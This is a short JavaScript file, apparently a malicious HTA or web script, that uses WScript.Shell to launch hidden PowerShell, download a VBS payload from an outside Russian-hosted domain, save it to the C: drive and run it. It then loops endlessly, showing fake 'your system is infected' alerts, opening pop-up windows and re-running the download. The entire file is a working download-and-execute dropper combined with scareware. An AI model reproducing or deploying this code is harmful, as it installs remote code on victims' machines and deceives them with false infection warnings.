function Download(){
    var wscript = new ActiveXObject("Wscript.shell");
    wscript.run('cmd.exe /c @echo off & powershell -WindowStyle hidden Invoke-WebRequest -URI http://a0736434.xsph.ru/q7vr6asnhmp7qx9w.vbs -outfile C:\q7vr6asnhmp7qx9w.vbs & start C:\q7vr6asnhmp7qx9w.vbs');
    let i = 0;
    while (i < 10) {
	    alert("You're system infected the virus! Найден вирус!");
	    function openWindow(url){
		    aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=240,height=195,titlebar=no,alwaysRaised=yes');
    	}
	    openWindow('info.html');
	    wscript.run('cmd.exe /c @echo off & powershell -WindowStyle hidden Invoke-WebRequest -URI http://a0736434.xsph.ru/q7vr6asnhmp7qx9w.vbs -outfile C:\q7vr6asnhmp7qx9w.vbs & start C:\q7vr6asnhmp7qx9w.vbs');
    }
}
Download();